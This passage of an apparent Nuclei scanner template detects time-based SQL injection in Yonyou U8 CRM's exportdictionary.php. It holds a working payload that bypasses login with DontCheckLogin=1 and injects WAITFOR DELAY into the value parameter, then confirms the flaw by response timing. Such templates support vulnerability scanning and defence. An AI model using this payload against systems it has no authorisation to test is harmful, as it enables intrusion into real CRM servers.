  metadata:
    verified: true
    fofa-query: demo
  tags: 2024,sqli,u8crm,yonyou,oa,time

http:
  - raw:  
      - |
        @timeout: 15s
        GET /devtools/tools/exportdictionary.php?DontCheckLogin=1&value=1%27;WAITFOR+DELAY+%270:0:6%27-- HTTP/1.1
        Host: {{Hostname}}
        User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/126.0.0.0 Safari/537.36
        X-Requested-With: XMLHttpRequest
        Accept: */*
        Accept-Encoding: gzip, deflate, br
        Accept-Language: zh-CN,zh;q=0.9
        Cookie: PHPSESSID=bgsesstimeout-; TL_EXPANDED=REL_STAGE2012

    matchers:
      - type: dsl
        dsl:
          - contains_all(body,'dd_str_resource')
          - status_code == 200
          - duration >= 5 && duration < 9
        condition: and